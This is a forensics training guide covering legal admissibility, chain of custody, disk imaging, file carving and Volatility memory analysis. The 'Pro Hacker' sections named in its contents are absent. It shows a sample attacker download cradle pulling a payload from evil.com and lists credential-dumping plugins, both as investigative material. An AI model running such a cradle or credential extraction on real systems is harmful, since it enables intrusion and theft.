# 🔍 Digital Forensics & Pro Hacker — Complete Mastery Guide (Expanded)

### From Cyber Security Student to Professional Security Expert / Police Forensics Support

> **Who is this for?** Cyber security department student with MERN dev background, basic hacking,
> WiFi attacks, web vulnerabilities, reverse engineering already covered. This expanded edition adds
> deeper technical detail, more tools, and law-enforcement-grade rigor (chain of custody, legal
> admissibility) on top of the original guide, for someone aiming to support police digital forensics work.

> ⚖️ **Authorization note**: every technique below assumes a forensic examiner with legal authority
> (warrant, consent, internal policy) or a pentester with signed scope. Same tools, different
> authorization — that line is what separates lawful work from a crime.

---

## 📚 Table of Contents

### PART A — DIGITAL FORENSICS (Expanded)

1. What is Digital Forensics? — Legal Foundations
2. Forensics Lab Setup — Full Toolchain
3. Disk Forensics — Deep Dive
4. Memory Forensics — Deep Dive
5. Network Forensics — Deep Dive
6. File System Forensics — NTFS/EXT4/APFS Internals
7. Log Analysis — Windows/Linux/Cloud
8. Mobile Forensics — Android/iOS Deep Dive
9. Malware Forensics — Static & Dynamic
10. Email Forensics — Headers, Spoofing, Phishing

### PART B — PRO HACKER SKILLS (Expanded)

11. Pro Hacker Mindset & Attacker Psychology
12. Pentest Methodology — Full Lifecycle
13. Advanced Reconnaissance — OSINT Mastery
14. Exploitation Mastery — Web/Binary/Network
15. Post-Exploitation — Windows/Linux Deep Dive
16. Pivoting & Lateral Movement
17. Anti-Forensics & Covering Tracks (and how examiners detect it)
18. Report Writing — Court-Ready & Pentest-Ready
19. CTF Strategy
20. Career Roadmap — Police Forensics Track

---

# PART A — DIGITAL FORENSICS

## 1. What is Digital Forensics? — Legal Foundations

### Definition (Expanded)

Digital forensics is the application of scientific methods to identify, preserve, collect, examine,
analyze, and present digital evidence in a manner that is legally admissible and scientifically
sound. The discipline borrows its rigor from traditional forensic science: the same standard of
"could another qualified examiner reproduce your result from your documentation" applies.

```
Branches of Digital Forensics:
  Computer Forensics    → disks, file systems, OS artifacts
  Network Forensics     → traffic, logs, intrusion reconstruction
  Mobile Forensics       → phones, tablets, app data
  Memory Forensics       → RAM, volatile state
  Malware Forensics      → reverse engineering malicious code
  Cloud Forensics         → SaaS logs, cloud storage, container forensics
  IoT Forensics            → smart devices, embedded systems
  Database Forensics       → SQL transaction logs, deleted records
```

### Legal Admissibility — Why This Matters More for Police Work

In a courtroom, the opposing side's entire strategy is often to attack **how** evidence was
obtained, not what it shows. Two legal doctrines you must understand:

```
DAUBERT STANDARD (US) / equivalent standards elsewhere:
  Evidence/testimony must be based on:
  1. Testable, falsifiable methodology
  2. Known or potential error rate
  3. Peer review / publication of the method
  4. General acceptance in the relevant scientific community

  Practical effect: "I just felt like the file was deleted by the suspect"
  is worthless. "fls recovered inode 4821, MAC times show deletion at
  14:32:07 on [date], consistent with $LogFile entry #88231" is admissible.

BEST EVIDENCE RULE:
  Courts prefer original evidence. Since forensic images are not the
  "original" disk, you must prove the IMAGE is a true, unaltered copy.
  This is exactly what hashing (MD5/SHA256) before and after acquisition
  proves — it's not a formality, it's the legal bridge between original
  and copy.
```

### Locard's Exchange Principle (Digital Application)

```
"Every contact leaves a trace" — Edmond Locard, 1910 (physical forensics)

Digital equivalent: every action on a computer leaves SOME trace, even if
the user tries to delete it:
  - Deleting a file ≠ erasing the data; it just marks space as reusable
  - Clearing browser history leaves DNS cache, ARP cache, router logs
  - Using incognito mode still touches RAM, swap, DNS
  - Wiping a drive (if not done correctly) leaves remnants in slack space,
    HPA/DCO regions, or SSD over-provisioned blocks

Your job as an examiner: find the trace the suspect didn't think to erase.
```

### Order of Volatility (RFC 3227) — Critical for Collection Priority

When you have limited time on a live system, collect evidence in this order
(most volatile first, because it disappears soonest):

```
1. CPU registers, cache                    (nanoseconds)
2. RAM (routing table, ARP cache, process table, kernel stats) (seconds)
3. Network state (active connections)      (seconds-minutes)
4. Running processes                        (minutes)
5. Disk (temp files, swap)                  (hours-days)
6. Remote logging / monitoring data         (varies)
7. Physical configuration, network topology (relatively stable)
8. Archival media, backups                  (long-term stable)

PRACTICAL RULE: if a machine is live and you must choose between imaging
the disk first or capturing RAM first — capture RAM first. Disk isn't
going anywhere; RAM dies the moment power is cut or the box reboots.
```

### Chain of Custody — Expanded Template

```
Beyond the basic table, a court-ready chain of custody form should record:

  EVIDENCE ITEM
  ─────────────
  Case number:
  Item number:
  Description (make/model/serial):
  Source location (where/how seized):

  ACQUISITION
  ───────────
  Date/time of acquisition:
  Examiner name & badge/ID:
  Tool + version used (e.g. dc3dd 7.2.646):
  Write-blocker used? (model/serial):
  Hash algorithm(s) + value(s) BEFORE acquisition (if possible):
  Hash algorithm(s) + value(s) AFTER acquisition:
  Image format (raw/E01/AFF):

  CUSTODY LOG (every single transfer, no gaps allowed)
  ───────────
  Date | Time | From | To | Reason | Signature

  STORAGE
  ───────
  Storage location:
  Access control (who can access, how is access logged):

A SINGLE GAP in this log — even a few unexplained hours — can be enough
for a defense attorney to successfully argue evidence tampering.
```

### Forensic Soundness — The 4 Pillars

```
1. MEANING preserved   → data interpreted correctly, not altered
2. ERRORS minimized    → documented methodology, validated tools
3. TRANSPARENCY        → process can be explained and repeated
4. EXPERIENCE applied  → examiner qualified to do the analysis

Tool validation matters: NIST's CFTT (Computer Forensics Tool Testing)
project publishes validated test results for forensic tools. In a serious
case, expect to be asked "has this tool been validated, and do you have
the report?" Reference: https://www.nist.gov/itl/ssd/software-quality-group/computer-forensics-tool-testing-program-cftt
```

---

## 2. Forensics Lab Setup — Full Toolchain

### Hardware Considerations (Beyond Software)

```
WRITE BLOCKERS (hardware) — non-negotiable for real evidence:
  Tableau T35689, T8 (USB/SATA write blockers)
  WiebeTech forensic bridges
  These physically prevent write commands from reaching the original
  drive. Software write-blocking (mount -o ro) is acceptable for
  LEARNING/practice but a defense attorney will challenge software-only
  blocking in a contested case — always prefer hardware in real work.

DRIVE DUPLICATORS (for speed at scale):
  Tableau TD3, Logicube Falcon — image multiple drives in parallel,
  hardware-accelerated hashing.

FARADAY BAGS:
  For seized phones — prevents remote wipe commands, blocks cell/wifi/
  bluetooth signals from reaching the device before you can image it
  or put it in airplane mode under controlled conditions.

WRITE-ONCE MEDIA:
  Store final images/reports on WORM (write once read many) media or
  at minimum read-only, checksummed archive storage.
```

### Full Software Toolchain (Parrot OS / Debian-based)

```bash
sudo apt update && sudo apt upgrade -y

# ── DISK FORENSICS ──────────────────────────────────────────────
sudo apt install -y \
  autopsy sleuthkit dc3dd dcfldd foremost scalpel \
  bulk-extractor testdisk photorec guymager \
  # guymager = GUI imaging tool with built-in hashing, very common in LE labs
  ewf-tools \
  # libewf / ewfacquire — creates EnCase (.E01) format images, the
  # de facto standard format accepted by courts and most LE tool suites
  afflib-tools
  # AFF (Advanced Forensic Format) — open alternative to E01

# ── MEMORY FORENSICS ────────────────────────────────────────────
pip3 install volatility3 --break-system-packages
sudo apt install -y lime-forensics

# ── NETWORK FORENSICS ───────────────────────────────────────────
sudo apt install -y wireshark tshark tcpdump zeek
# NetworkMiner is Windows-native; run via Wine or in a Windows VM
pip3 install scapy --break-system-packages

# ── FILE ANALYSIS / METADATA ────────────────────────────────────
sudo apt install -y binwalk exiftool hexedit xxd file \
  steghide stegsolve outguess

# ── HASH / INTEGRITY ─────────────────────────────────────────────
sudo apt install -y hashdeep
# hashdeep over plain md5sum/sha256sum: supports recursive hashing of
# entire directory trees and "audit mode" — compare a whole evidence
# set against a known-good hash set in one command:
#   hashdeep -r -c sha256 ./evidence > evidence.hashes
#   hashdeep -a -k evidence.hashes -r ./evidence_copy  (audit/compare)

# ── REGISTRY / WINDOWS ARTIFACT PARSING ─────────────────────────
pip3 install regipy python-registry --break-system-packages
git clone https://github.com/EricZimmerman/RegistryExplorer  # reference, Windows GUI tool
# Eric Zimmerman's tools (run via mono or in a Windows VM) are the
# industry-standard free toolkit for Windows artifact parsing:
#   MFTECmd, RegistryExplorer, EvtxECmd, PECmd (Prefetch), AmcacheParser,
#   ShellBagsExplorer, JLECmd (jump lists), SQLECmd, Timeline Explorer
# Get them from: https://ericzimmerman.github.io/

# ── MOBILE FORENSICS ──────────────────────────────────────────────
sudo apt install -y adb android-sdk-platform-tools
pip3 install mvt aleapp --break-system-packages

# ── LOG ANALYSIS ────────────────────────────────────────────────
sudo apt install -y logwatch grepcidr
pip3 install pandas matplotlib jupyter python-evtx --break-system-packages

# ── TIMELINE ANALYSIS ────────────────────────────────────────────
sudo apt install -y plaso
# plaso (log2timeline + psort) — automatically extracts timestamped
# events from dozens of artifact types (registry, browser history,
# event logs, file system) into a single supertimeline. This is the
# single most powerful correlation tool in the kit.
log2timeline.py --storage-file case.plaso /mnt/evidence
psort.py -w timeline.csv case.plaso

echo "Full forensics toolchain installed."
```

### Case Workspace — LE-Grade Structure

```bash
mkdir -p ~/forensics_lab/cases/case001/{evidence_originals,images,working_copies,analysis,reports,logs,exports}

# evidence_originals/ → metadata ABOUT original evidence (never store
#                       the physical original here — that's in a safe/
#                       evidence locker). This folder holds photos of
#                       the item, seizure paperwork, custody forms.
# images/             → the forensic image files (E01/raw) — READ ONLY
#                       once created. chmod 444 these immediately.
# working_copies/      → a COPY of the image you actually mount/analyze
#                       so you never risk touching images/ directly
# analysis/             → your notes, carved files, timeline output
# reports/              → draft and final reports
# logs/                  → acquisition logs, hash logs, tool output logs
# exports/                → final exhibits prepared for court/disclosure

chmod 555 ~/forensics_lab/cases/case001/images  # lock down after imaging
```

### Validating Your Tools (Do This Once, Document It)

```bash
# Create a known test file, hash it with two independent tools,
# confirm they match. Do this for every tool in your chain before
# you trust it on real evidence — and document the validation date.

echo "test data 12345" > /tmp/validation_test.txt
md5sum /tmp/validation_test.txt
sha256sum /tmp/validation_test.txt
hashdeep -c md5,sha256 /tmp/validation_test.txt
# All three must agree. Record this in your lab's tool validation log.
```

---

## 3. Disk Forensics — Deep Dive

### Choosing an Image Format

```
RAW (.dd / .img)
  + Universal, every tool reads it
  + Bit-for-bit, simplest format
  - No built-in metadata, no compression, no embedded hash
  - Need a separate file for hash/case info

E01 (EnCase Evidence Format)
  + Industry standard, accepted by virtually all LE tools (EnCase, FTK,
    Autopsy, X-Ways)
  + Built-in compression (smaller files)
  + Embeds metadata: examiner name, case number, acquisition date,
    notes, AND a CRC32 per block + MD5/SHA1 of the whole image
  + Self-verifying — if a chunk is corrupted, future analysis will flag it
  - Slightly more complex tooling (libewf)
  → Use this for real case work if your tools support it.

AFF / AFF4
  + Open-source alternative to E01, similar features
  - Less universally supported by commercial LE tools
```

### Creating a Forensically Sound E01 Image (LE-Grade)

```bash
sudo apt install ewf-tools

ewfacquire /dev/sdb \
  -t ~/forensics_lab/cases/case001/images/case001_disk1 \
  -c best \
  -d sha256 \
  -e "Examiner Name" \
  -m removable \
  -N "Case 001 - seized USB drive, item #4" \
  -u "case001"
# Interactive prompts will also ask for case number, evidence number,
# description, notes — ANSWER THESE ACCURATELY, they become part of
# the legal record embedded in the image itself.

# Verify the image after creation:
ewfverify ~/forensics_lab/cases/case001/images/case001_disk1.E01
# Compares the stored hash inside the E01 against a fresh re-hash of
# the data blocks. PASS = image integrity confirmed.
```

### Handling HPA and DCO (Hidden Areas Attackers/Suspects Use)

```bash
# HPA (Host Protected Area) and DCO (Device Configuration Overlay) are
# regions of a drive that the drive controller hides from the OS.
# Some users hide data here; more often it's leftover from OEM recovery
# partitions, but ALWAYS CHECK — missing an HPA/DCO is a classic way
# to miss evidence.

sudo hdparm -N /dev/sdb        # Check for HPA (shows max native sectors
                                # vs currently visible sectors)
sudo hdparm --dco-identify /dev/sdb   # Check for DCO

# If HPA exists, the BIOS/OS sees a smaller disk than the disk's real
# native capacity. You must temporarily reset it (on a WRITE-BLOCKED
# duplicate, never the original) to image the full physical disk:
sudo hdparm -N pXXXXXXXX /dev/sdb   # set max sectors back to native
# Document this step explicitly in your report — this is exactly the
# kind of action a defense attorney will ask about.
```

### Sleuth Kit — Full Command Reference

```bash
# fsstat — filesystem-level metadata
fsstat case001_disk1.E01
# Shows: FS type, OEM name, volume serial, sector/cluster size,
# total clusters, MFT location (NTFS) or superblock info (ext)

# fls — list files including deleted, with full flags
fls -r -p case001_disk1.E01           # -r recursive, -p full path
fls -rd case001_disk1.E01             # -d deleted entries only
fls -rlu case001_disk1.E01            # -l long format (size, time)
#   File type flags:  r = regular file   d = directory
#   Allocation flags: r = allocated      * = unallocated (deleted)

# istat — full metadata for one inode/MFT entry
istat case001_disk1.E01 4521
# NTFS output includes: $STANDARD_INFORMATION timestamps AND
# $FILE_NAME timestamps — these can DIFFER if timestamps were tampered
# with (timestomping), because $FILE_NAME timestamps are harder for
# attacker tools to modify. A mismatch is a strong anti-forensics indicator.

# icat — extract content by inode (works on deleted files if unallocated
# blocks haven't been overwritten yet)
icat case001_disk1.E01 4521 > recovered.docx

# tsk_recover — recover ALL files at once (allocated + deleted)
tsk_recover -a case001_disk1.E01 ./recovered_all/   # -a = allocated only
tsk_recover -e case001_disk1.E01 ./recovered_all/   # -e = everything

# blkstat / blkcat — block-level analysis (for carving / slack space)
blkstat case001_disk1.E01 8821
blkcat case001_disk1.E01 8821 > block_8821.raw

# sigfind — search for a byte signature across the whole image
sigfind -o 0 "4D5A" case001_disk1.E01    # search for MZ header (EXE)
```

### File Carving — Going Deeper Than the Basics

```bash
# foremost / scalpel work on FILE SIGNATURES (magic bytes) and are
# "dumb" carvers — fast but produce false positives and can't recover
# fragmented files (files split across non-contiguous blocks).

# bulk_extractor is smarter — built-in carvers for specific structures
# PLUS scanners for emails, URLs, credit card numbers, EXIF GPS data,
# and even JPEG re-assembly across fragments:
bulk_extractor -o ./bulk_output/ case001_disk1.E01
ls ./bulk_output/
cat ./bulk_output/email.txt      # every email address found anywhere
cat ./bulk_output/ccn.txt        # every credit-card-looking number found
cat ./bulk_output/exif.txt       # EXIF data (GPS coords!) from any JPEG fragment

# PhotoRec for fragmented recovery — uses a different algorithm
# (file-specific heuristics, not just header/footer) and handles many
# more file types than foremost:
photorec /log /d ./photorec_output/ case001_disk1.E01

# Manual carving when automated tools miss something — find a known
# header, locate the matching footer, carve the range with dd:
xxd case001_disk1.E01 | grep -A2 "ffd8 ffe0"   # find JPEG header offset
dd if=case001_disk1.E01 of=carved.jpg bs=1 skip=<offset> count=<size>
```

### Slack Space and Unallocated Space — Where Deleted Data Hides

```
SLACK SPACE: when a file doesn't fill its last cluster completely, the
leftover bytes in that cluster can contain remnants of WHATEVER was
there before (an older, different file). This is a goldmine for finding
fragments of deleted/overwritten data.

  blkls -s case001_disk1.E01 > slack_space.raw   # extract all slack space
  strings slack_space.raw | less                  # search for readable text

UNALLOCATED SPACE: clusters not currently assigned to any file. Deleted
file content lives here until overwritten.

  blkls case001_disk1.E01 > unallocated.raw
  foremost -i unallocated.raw -o ./carved_from_unalloc/
```

---

## 4. Memory Forensics — Deep Dive

### Why Memory Forensics Wins Cases Disk Forensics Can't

```
Sophisticated malware and careful attackers increasingly avoid touching
disk at all:
  - Fileless malware (PowerShell-only, living entirely in memory)
  - Process hollowing / injection (legit process, malicious code in RAM)
  - In-memory credential theft (Mimikatz-style)
  - Encrypted volumes — the decryption KEY only exists in RAM while mounted

If you only image the disk, you miss ALL of this. Memory should be
captured FIRST on any live, running suspect machine, before it's powered
off or imaged.
```

### Capture Method Selection

```
LIVE LINUX SYSTEM      → LiME (kernel module, most forensically sound)
LIVE WINDOWS SYSTEM    → WinPmem, Magnet RAM Capture, FTK Imager (memory
                          capture mode), Belkasoft RAM Capturer
VIRTUAL MACHINE        → Suspend/snapshot — instantly gives you a
                          memory-state file with zero extra tooling:
                          VMware  → .vmem file in the VM's folder
                          VirtualBox → Machine > Take Snapshot, find
                                       the .sav file
                          Hyper-V → Checkpoint, then export the .vsv/.bin
ALREADY POWERED OFF     → memory is gone. This is why "pull the plug
                          immediately" is often WRONG advice — if
                          there's any chance the system is live and
                          relevant, capture RAM before powering down.
```

### LiME — Detailed Build and Capture

```bash
sudo apt install -y linux-headers-$(uname -r) build-essential git
git clone https://github.com/504ensicsLabs/LiME
cd LiME/src
make

# Capture to local disk (simplest, but writes to the same machine being
# investigated — only acceptable if you have a dedicated forensic
# partition/external drive mounted for this purpose):
sudo insmod lime.ko "path=/mnt/external/memory.lime format=lime"

# BETTER: capture over network to a separate forensic workstation,
# avoiding any write to the suspect machine's own disk:
# On the FORENSIC WORKSTATION (listener):
nc -l -p 4444 > memory.lime
# On the SUSPECT MACHINE:
sudo insmod lime.ko "path=tcp:4444 format=lime"

# Always hash the resulting file immediately:
sha256sum memory.lime
```

### Volatility 3 — Full Plugin Walkthrough

```bash
# ── PROFILE / OS IDENTIFICATION ──────────────────────────────────
vol -f memory.lime windows.info.Info
vol -f memory.lime linux.info.Info
vol -f memory.lime mac.info.Info       # macOS support also exists

# ── PROCESS LISTING — THREE DIFFERENT VIEWS, USE ALL THREE ───────
vol -f memory.lime windows.pslist.PsList     # walks the OS's own linked
                                               # list of processes (what
                                               # the OS believes is running)
vol -f memory.lime windows.psscan.PsScan     # scans memory pool for
                                               # process structures
                                               # REGARDLESS of whether
                                               # they're in the OS list
vol -f memory.lime windows.pstree.PsTree     # parent-child tree

# THE KEY ROOTKIT-DETECTION TECHNIQUE:
# Run pslist AND psscan, diff the PID lists.
# A PID in psscan but NOT in pslist = the process was UNLINKED from the
# OS's list (a classic rootkit hiding technique called DKOM —
# Direct Kernel Object Manipulation) = almost certainly malicious.

vol -f memory.lime windows.pslist.PsList | awk '{print $1}' > pids_pslist.txt
vol -f memory.lime windows.psscan.PsScan | awk '{print $1}' > pids_psscan.txt
diff pids_pslist.txt pids_psscan.txt

# ── PARENT-CHILD ANOMALIES ────────────────────────────────────────
# Legitimate parent/child pairs to know:
#   explorer.exe → most user-launched programs
#   services.exe → svchost.exe instances
#   winlogon.exe → userinit.exe
# SUSPICIOUS patterns:
#   svchost.exe spawned by something OTHER than services.exe
#   cmd.exe or powershell.exe spawned by Word/Excel/Outlook (macro malware!)
#   lsass.exe with an unusual parent (credential theft prep)

# ── NETWORK ───────────────────────────────────────────────────────
vol -f memory.lime windows.netscan.NetScan
# Columns: Offset, PID, Owner, Local Addr, Foreign Addr, State, Created
# Cross-reference PID against your process list. A process you've never
# heard of with an established connection to an unfamiliar external IP
# is your starting lead.

# ── MALWARE / INJECTION DETECTION ────────────────────────────────
vol -f memory.lime windows.malfind.Malfind
# Flags memory regions that are PAGE_EXECUTE_READWRITE (RWX) and not
# backed by a file on disk — legitimate code is normally either
# read-execute (from a DLL/EXE on disk) or read-write (data), RWX
# unbacked memory is a massive red flag for shellcode/injected code.
# Output includes a hex dump and disassembly snippet of the suspicious
# region.

vol -f memory.lime windows.dlllist.DllList --pid <PID>
# Compare against a known-good baseline for that process. Extra DLLs,
# especially ones loaded from %TEMP% or unusual paths, indicate
# DLL injection / sideloading.

vol -f memory.lime windows.ldrmodules.LdrModules
# Cross-references 3 different module-tracking lists in the PEB.
# A module present in memory but missing from one or more of these
# lists indicates a HOLLOWED or manually-mapped module — classic
# process hollowing indicator that DllList alone won't catch.

vol -f memory.lime windows.hollowprocesses.HollowProcesses
# Newer Vol3 plugin specifically targeting process hollowing.

# ── CREDENTIAL EXTRACTION ─────────────────────────────────────────
vol -f memory.lime windows.hashdump.Hashdump
vol -f memory.lime windows.cachedump.Cachedump   # domain cached creds
vol -f memory.lime windows.lsadump.Lsadump        # LSA secrets

# ── PERSISTENCE MECHANISMS VIA REGISTRY IN MEMORY ─────────────────
vol -f memory.lime windows.registry.printkey.PrintKey \
    --key "Microsoft\Windows\CurrentVersion\Run"
vol -f memory.lime windows.registry.printkey.PrintKey \
    --key "Microsoft\Windows\CurrentVersion\RunOnce"
vol -f memory.lime windows.svcscan.SvcScan
# Lists Windows services from memory — check for services with
# suspicious binary paths, especially ones pointing into %TEMP% or
# %APPDATA%, or services set to auto-start that you don't recognize.

# ── COMMAND LINE / PROCESS ARGUMENTS ──────────────────────────────
vol -f memory.lime windows.cmdline.CmdLine
# Shows the FULL command line each process was launched with — this
# alone often reveals attacker tooling, e.g.:
#   powershell.exe -enc <base64>   → encoded PowerShell, classic
#                                     attacker obfuscation, decode the
#                                     base64 to see the real command

vol -f memory.lime windows.envars.Envars  --pid <PID>
# Environment variables per process — can reveal proxy settings,
# unusual PATH entries pointing to attacker tools.

# ── FILE HANDLES / OPEN FILES PER PROCESS ─────────────────────────
vol -f memory.lime windows.handles.Handles --pid <PID>

# ── CLIPBOARD (sometimes recoverable) ─────────────────────────────
vol -f memory.lime windows.clipboard.Clipboard

# ── DUMPING SPECIFIC PROCESS MEMORY OR FILES ─────────────────────
vol -f memory.lime windows.pslist.PsList --pid <PID> --dump
vol -f memory.lime windows.dumpfiles.DumpFiles --pid <PID>
vol -f memory.lime windows.memmap.Memmap --pid <PID> --dump

# ── TIMELINE ────────────────────────────────────────────────────
vol -f memory.lime timeliner.Timeliner --output csv > memory_timeline.csv
```

### Decoding Base64 PowerShell Found in Memory

```bash
# Attacker command lines often look like:
# powershell.exe -nop -w hidden -enc SQBuAHYAbwBrAGUALQBXAGUAYgBSAGUAcQB1AGUAcwB0AC...

# PowerShell -enc expects UTF-16LE base64. Decode with:
echo "SQBuAHYAbwBrAGUA..." | base64 -d | iconv -f UTF-16LE -t UTF-8
# Reveals the actual command — frequently a download cradle:
# IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')
```

### Linux Memory Forensics (Often Overlooked)

```bash
vol -f memory.lime linux.pslist.PsList
vol -f memory.lime linux.pstree.PsTree
vol -f memory.lime linux.bash.Bash          # recovers bash command
                                              # history DIRECTLY FROM
                                              # MEMORY — including
                                              # commands a user thought
                                              # they erased with
                                              # `history -c`, because
                                              # the in-memory readline
                                              # buffer isn't cleared
vol -f memory.lime linux.lsof.Lsof          # open file descriptors
vol -f memory.lime linux.netstat.Netstat
vol -f memory.lime linux.malfind.Malfind
vol -f memory.lime linux.check_syscall.Check_syscall
# Detects syscall table hooking — a classic Linux rootkit technique
# where syscalls are redirected to malicious code.
vol -f memory.lime linux.check_modules.Check_modules
# Compares loaded kernel modules in memory against /proc/modules —
# discrepancies indicate a hidden/unlinked malicious kernel module.
```
